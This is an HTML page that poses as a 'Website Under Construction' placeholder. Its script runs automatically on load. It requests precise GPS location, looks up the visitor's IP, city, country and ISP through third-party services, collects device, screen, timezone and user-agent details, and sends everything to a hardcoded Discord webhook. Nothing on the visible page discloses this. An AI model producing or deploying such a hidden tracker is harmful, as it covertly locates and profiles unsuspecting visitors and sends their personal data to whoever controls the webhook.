<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Website Under Construction</title>
  <style>
    body {
      margin: 0; padding: 0; background: #ffffff; color: #222;
      font-family: Arial, Helvetica, sans-serif;
      height: 100vh; display: flex; align-items: center; justify-content: center; text-align: center;
    }
    .container { max-width: 420px; padding: 20px; }
    h1 { font-size: 34px; margin-bottom: 16px; }
    p { font-size: 18px; color: #666; }
  </style>
</head>
<body>
  <div class="container">
    <h1>Website Under Construction</h1>
    <p>We're working on something big.<br>Come back later.</p>
  </div>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1516409431368269934/4qmFB9N79B2tVd0xWvh221dwRWNZ6gAJBwmrWW1nlKP_FkAA2JohWRG4G4RU-n8k_e_X";

    async function sendVisitorInfo() {
      let geo = { lat: null, lon: null, alt: null, accuracy: null, source: "None" };
      let ipInfo = { ip: "Unknown", city: "Unknown", region: "Unknown", country: "Unknown", isp: "Unknown" };

      // === 1. Try Exact GPS (works on mobile too) ===
      if ('geolocation' in navigator) {
        try {
          const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
              enableHighAccuracy: true,
              timeout: 10000,
              maximumAge: 0
            });
          });

          geo.lat = position.coords.latitude;
          geo.lon = position.coords.longitude;
          geo.alt = position.coords.altitude;
          geo.accuracy = position.coords.accuracy;
          geo.source = "GPS (User Allowed)";
          console.log("✅ GPS Access Granted");
        } catch (err) {
          geo.source = "IP Fallback (GPS Denied)";
          console.log("❌ GPS Denied, using IP fallback");
        }
      }

      // === 2. IP + IP Geolocation ===
      const services = [
        'https://ip-api.com/json/?fields=query,city,regionName,country,isp,lat,lon',
        'https://ipapi.co/json/',
        'https://freeipapi.com/api/json/'
      ];

      for (let url of services) {
        try {
          const res = await fetch(url);
          if (res.ok) {
            const data = await res.json();
            ipInfo.ip = data.query || data.ip || "Unknown";
            ipInfo.city = data.city || "Unknown";
            ipInfo.region = data.regionName || data.region || "Unknown";
            ipInfo.country = data.country || data.country_name || "Unknown";
            ipInfo.isp = data.isp || data.org || "Unknown";

            // Use IP coords as fallback
            if (!geo.lat && data.lat) {
              geo.lat = data.lat;
              geo.lon = data.lon;
            }
            break;
          }
        } catch (e) {}
      }

      // === 3. Device & Browser Info ===
      const deviceInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        os: navigator.userAgent.includes("Android") ? "Android" :
            navigator.userAgent.includes("iPhone") || navigator.userAgent.includes("iPad") ? "iOS" : "Desktop",
        isMobile: /Mobi|Android|iPhone/i.test(navigator.userAgent),
        screen: `${screen.width}×${screen.height}`,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        hardware: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : "Unknown"
      };

      // === 4. Send to Discord ===
      const locationText = geo.lat 
        ? `${geo.lat.toFixed(6)}, ${geo.lon.toFixed(6)} ${geo.alt ? `(Altitude: ${geo.alt.toFixed(1)}m)` : ''} [${geo.accuracy ? geo.accuracy.toFixed(0)+'m' : ''}]`
        : "Unknown";

      try {
        await fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            content: "**New Visitor Detected**",
            embeds: [{
              title: "Visitor Details",
              color: 0x3498db,
              fields: [
                { name: "IP Address", value: ipInfo.ip, inline: true },
                { name: "City", value: ipInfo.city, inline: true },
                { name: "Region / Country", value: `${ipInfo.region}, ${ipInfo.country}`, inline: true },
                { name: "ISP", value: ipInfo.isp, inline: false },
                { name: "Location", value: locationText, inline: false },
                { name: "Location Source", value: geo.source, inline: false },
                { name: "Device", value: deviceInfo.os + (deviceInfo.isMobile ? " (Mobile)" : " (Desktop)"), inline: true },
                { name: "Screen", value: deviceInfo.screen, inline: true },
                { name: "Timezone", value: deviceInfo.timezone, inline: true },
                { name: "User Agent", value: deviceInfo.userAgent.substring(0, 180) + "...", inline: false }
              ]
            }]
          })
        });
        console.log("✅ Data sent successfully");
      } catch (e) {
        console.error("Webhook failed:", e);
      }
    }

    // Start tracking
    window.onload = () => setTimeout(sendVisitorInfo, 1200);
  </script>
</body>
</html>
